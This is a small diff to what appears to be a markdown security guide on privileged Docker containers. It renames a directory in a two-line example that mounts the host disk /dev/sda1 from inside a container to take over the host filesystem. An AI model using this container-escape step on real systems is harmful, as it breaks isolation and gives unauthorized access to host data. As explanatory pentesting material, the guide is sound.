@@ -51,8 +51,8 @@ Well configured docker containers won't allow command like **fdisk -l**. However
 So to take over the host machine, it is trivial:
 
 ```bash
-mkdir -p /mnt/hola
-mount /dev/sda1 /mnt/hola
+mkdir -p /mnt/hole
+mount /dev/sda1 /mnt/hole
 ```
 
 And voilà ! You can now acces the filesystem of the host because it is mounted in the /mnt/hole folder.
